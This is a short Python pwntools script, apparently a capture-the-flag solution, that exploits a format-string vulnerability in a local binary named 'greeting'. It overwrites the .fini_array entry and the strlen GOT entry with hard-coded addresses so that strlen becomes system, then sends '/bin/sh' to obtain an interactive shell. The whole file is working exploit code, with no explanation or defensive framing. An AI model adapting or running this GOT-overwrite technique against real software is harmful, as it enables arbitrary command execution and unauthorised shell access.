from pwn import *

# context.log_level = "debug"
pipe = process("./greeting")
# pipe = remote("127.0.0.1", 10001)

print(pipe.recvuntil("... "))

# addr to overwrite
fini_array = 0x08049934
strlenGOT = 0x08049a54

# overwrite to
addrGetnline = 0x8048614   
systemcall = 0x08048490 



payload = "TT"
payload += p32(fini_array).decode("iso-8859-1")      # 0x8614-18-14 = 34292
payload += p32(strlenGOT).decode("iso-8859-1")       # 0x18490-0x8614 = 65148
payload += p32(strlenGOT+2).decode("iso-8859-1")     # 0x20804 - 0x18490 = 33652
payload += "%34292c%12$hn"
payload += "%65148c%13$hn"
payload += "%33652c%14$hn"



pipe.sendline(payload)

pipe.sendline(b"/bin/sh")

pipe.interactive()


